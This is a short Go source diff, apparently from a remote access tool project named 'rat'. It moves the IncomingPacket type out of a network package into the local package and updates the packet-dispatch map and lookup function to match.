@@ -2,10 +2,9 @@ package main
 
 import (
 	"rat/common"
-	"rat/network"
 )
 
-type PacketMap map[common.PacketHeader]network.IncomingPacket
+type PacketMap map[common.PacketHeader]IncomingPacket
 
 var packets PacketMap
 
@@ -26,6 +25,6 @@ func init() {
 	packets[common.WindowsHeader] = WindowsPacket{}
 }
 
-func GetIncomingPacket(header common.PacketHeader) network.IncomingPacket {
+func GetIncomingPacket(header common.PacketHeader) IncomingPacket {
 	return packets[header]
 }
